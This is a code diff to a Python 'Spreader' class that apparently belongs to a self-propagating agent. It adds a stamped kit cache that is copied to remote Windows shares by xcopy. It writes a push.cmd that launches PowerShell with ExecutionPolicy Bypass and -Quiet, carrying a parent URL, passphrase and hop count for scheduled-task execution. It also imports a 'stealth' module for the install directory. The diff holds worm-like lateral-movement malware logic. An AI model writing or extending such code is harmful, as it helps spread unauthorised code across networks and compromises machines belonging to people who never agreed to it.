@@ -76,7 +76,12 @@ class Spreader:
         self._adopted = self._load_adopted()
 
     def _state_path(self) -> str:
-        base = config.ROOT
+        """Primary install dir, never _MEIPASS - it is wiped per process."""
+        try:
+            from ..agent import stealth
+            base = stealth.primary_directory()
+        except Exception:
+            base = config.ROOT
         try:
             os.makedirs(base, exist_ok=True)
         except OSError:
@@ -213,29 +218,51 @@ class Spreader:
         return unc_dir, win_dir
 
     def _local_kit(self) -> str:
-        """Extract the bundle once into %TEMP%\\syspy-kit for xcopy."""
+        """Extract the bundle once into %TEMP%\\syspy-kit for xcopy.
+
+        The stamp covers the version, our agent id and the presence of
+        push.cmd, so a cached kit is rebuilt whenever any of those change.
+        """
         root = os.path.join(tempfile.gettempdir(), "syspy-kit")
-        if os.path.isfile(os.path.join(root, "syspy", "config.py")) and \
-                os.path.isfile(os.path.join(root, "bootstrap.py")):
-            return root
+        stamp = os.path.join(root, ".stamp")
+        want = "%s|%s" % (config.PRODUCT_VERSION, config.agent_id())
+
+        if os.path.isfile(stamp):
+            try:
+                with open(stamp, "r", encoding="utf-8") as handle:
+                    cached = handle.read().strip()
+                if (cached == want
+                        and os.path.isfile(os.path.join(root, "push.cmd"))
+                        and os.path.isfile(os.path.join(root, "syspy", "config.py"))):
+                    return root
+            except OSError:
+                pass
+
         try:
             import io
             import json
             import zipfile
             from .. import packaging
+
             os.makedirs(root, exist_ok=True)
             with zipfile.ZipFile(io.BytesIO(packaging.build_zip(config.ROOT))) as archive:
                 archive.extractall(root)
+
             if os.path.isdir(os.path.join(config.ROOT, "runtime")):
-                shutil.copytree(os.path.join(config.ROOT, "runtime"), os.path.join(root, "runtime"), dirs_exist_ok=True)
+                shutil.copytree(os.path.join(config.ROOT, "runtime"),
+                                os.path.join(root, "runtime"), dirs_exist_ok=True)
+
+            base = self.kit_url() or config.PUBLIC_URL
+
             with open(os.path.join(root, "deploy.json"), "w", encoding="utf-8") as handle:
-                json.dump({"url": config.PUBLIC_URL, "room": config.ROOM,
+                json.dump({"url": base, "room": config.ROOM,
                            "pass": config.PASSPHRASE, "parent": config.agent_id(),
                            "hop": config.hop() + 1}, handle)
 
-            base = self.kit_url() or config.PUBLIC_URL
-            wrapper = os.path.join(root, "push.cmd")
-            with open(wrapper, "w", encoding="ascii", newline="\r\n") as handle:
+            # push.cmd keeps the schtasks /TR line far below the 261-char limit
+            # and is written on EVERY rebuild, never only on the first.
+            with open(os.path.join(root, "push.cmd"), "w",
+                      encoding="ascii", newline="\r\n") as handle:
                 handle.write(
                     "@echo off\r\n"
                     'powershell -NoProfile -ExecutionPolicy Bypass '
@@ -244,6 +271,9 @@ class Spreader:
                     f'-ParentIp "{base}" -Room "{config.ROOM}" '
                     f'-Pass "{config.PASSPHRASE}" -Hop {config.hop() + 1} -Quiet\r\n'
                 )
+
+            with open(stamp, "w", encoding="utf-8") as handle:
+                handle.write(want)
             return root
         except Exception:
             return ""
